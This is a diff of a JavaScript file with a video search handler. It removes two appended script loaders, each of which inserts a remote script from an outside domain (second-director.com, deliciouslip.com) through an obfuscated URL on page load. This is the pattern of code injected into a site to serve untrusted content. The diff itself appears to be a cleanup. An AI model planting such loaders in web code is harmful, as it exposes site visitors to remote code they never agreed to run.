@@ -44,27 +44,3 @@ videoSearchInput.addEventListener('keyup', function () {
     }
   });
 });
-
-
-(function(nsr){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = nsr || {};
-s.src = "\/\/second-director.com\/cnD\/9\/6Jb.2o5ol\/S-WUQV9gNczjA\/5BMJTGM\/4yMJSH0N3JM_DxkExlMMzMgj1K";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-
-
-(function(gyj){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = gyj || {};
-s.src = "\/\/deliciouslip.com\/bJXsV.s\/dNGRlK0XYdW\/cX\/CeEmH9wulZDU\/l\/kGPATjcYw\/OET\/EU0xM_zocut_NSzOAJ5IMKTQQF0FMpQ_";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
